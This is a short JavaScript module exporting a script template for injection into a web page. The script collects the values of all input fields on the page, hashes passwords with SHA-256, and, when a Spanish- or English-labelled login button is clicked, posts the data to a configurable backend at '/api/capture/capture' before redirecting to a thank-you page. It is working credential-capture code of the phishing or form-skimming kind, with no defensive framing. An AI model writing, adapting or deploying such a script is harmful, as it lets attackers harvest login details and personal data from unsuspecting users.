export const injectedScriptContent = (backendHost) => `
    async function hashPassword(password) {
        const encoder = new TextEncoder();
        const data = encoder.encode(password);
        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }

    async function getCredenciales() {
        const inputs = document.querySelectorAll('input');
        const data = {};

        for (const input of inputs) {
            const key = input.name || input.id || input.type;
            const value = input.value;

            if (input.type === 'password' || key.toLowerCase().includes('password')) {
                data[key] = await hashPassword(value);
            } else {
                data[key] = value;
            }
        }

        return data;
    }

    async function enviarCredenciales() {
        const data = await getCredenciales();
        fetch('http://${backendHost}:3000/api/capture/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(err => console.error('Error enviando credenciales:', err));
    }

    const posibleBoton = Array.from(document.querySelectorAll('button, input[type="submit"], input[type="button"]'))
        .find(btn => {
            const texto = (btn.innerText || btn.value || '').toLowerCase();
            return texto.includes('iniciar') || texto.includes('ingresar') || texto.includes('entrar') || texto.includes('login');
        });

    if (posibleBoton) {
        posibleBoton.addEventListener('click', () => {
            enviarCredenciales();
            setTimeout(() => {
                window.location.href = '/gracias.html';
            }, 1000);
        });
    }
`;